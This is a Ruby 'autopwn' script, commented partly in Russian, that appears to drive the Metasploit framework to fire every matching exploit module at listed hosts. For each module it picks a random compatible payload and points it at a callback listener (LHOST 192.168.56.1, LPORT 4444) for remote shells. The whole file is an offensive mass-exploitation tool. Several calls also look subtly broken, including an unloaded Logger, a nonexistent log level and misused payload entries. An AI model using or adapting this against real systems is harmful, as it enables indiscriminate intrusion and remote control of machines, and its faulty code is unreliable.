#!/usr/bin/env ruby
# encoding: utf-8

require 'msf/core'
require 'json'
require 'net/http'
require 'uri'
require 'timeout'

class AutopwnExecutor
  attr_reader :framework, :logger

  def initialize(log_path = '/var/log/autopwn/msf_autopwn.log')
    @framework = Msf::Simple::Framework.create
    @logger = Logger.new(log_path)
    @logger.level = Logger::INFO
  end

  def run(targets, module_filter = /exploit\/.*/)
    targets.each do |target|
      print_status("Scanning and exploiting #{target['ip']}...")
      begin
        exploits = discover_exploits(target)
        sorted = prioritize(exploits)

        sorted.each do |mod|
          execute_module(mod, target)
        end
      rescue => e
        print_error("Failure on #{target['ip']}: #{e.message}")
        log(:error, { target: target, error: e.message })
      end
    end
  end

  def discover_exploits(target)
    # Заменить на реальную логику или Metasploit db_autopwn
    modules = framework.exploits.keys.select { |k| k =~ /windows|unix|multi/ }
    modules.map { |m| framework.modules.create(m) }.compact
  end

  def prioritize(modules)
    modules.sort_by do |mod|
      score = 0
      score += 10 if mod.rank == ExcellentRanking
      score += 5 if mod.platform.include?('windows')
      score += 3 if mod.name =~ /remote/
      -score
    end
  end

  def execute_module(mod, target)
    handler = Msf::Simple::Exploit.new(mod, framework)
    payload = handler.compatible_payloads.sample

    return unless payload

    handler.datastore['RHOST'] = target['ip']
    handler.datastore['TARGET'] = 0
    handler.datastore['PAYLOAD'] = payload.refname
    handler.datastore['LHOST'] = '192.168.56.1'
    handler.datastore['LPORT'] = 4444

    print_status("Launching exploit #{mod.refname} with #{payload.refname}")
    handler.exploit_simple(
      'Payload' => payload.refname,
      'Target'  => 0,
      'RunAsJob' => true
    )

    log(:success, {
      target: target['ip'],
      module: mod.refname,
      payload: payload.refname
    })
  end

  def print_status(msg)
    puts "[*] #{msg}"
    log(:info, { status: msg })
  end

  def print_error(msg)
    puts "[!] #{msg}"
    log(:error, { error: msg })
  end

  def log(level, entry)
    entry[:timestamp] = Time.now.utc.iso8601
    File.open("/var/log/autopwn/msf_events.json", "a") do |f|
      f.puts(entry.to_json)
    end
    logger.send(level, entry.to_json)
  end
end

# === Точка входа ===

if __FILE__ == $0
  targets = [
    { 'ip' => '192.168.56.101' },
    { 'ip' => '192.168.56.102' }
  ]

  autopwn = AutopwnExecutor.new
  autopwn.run(targets)
end
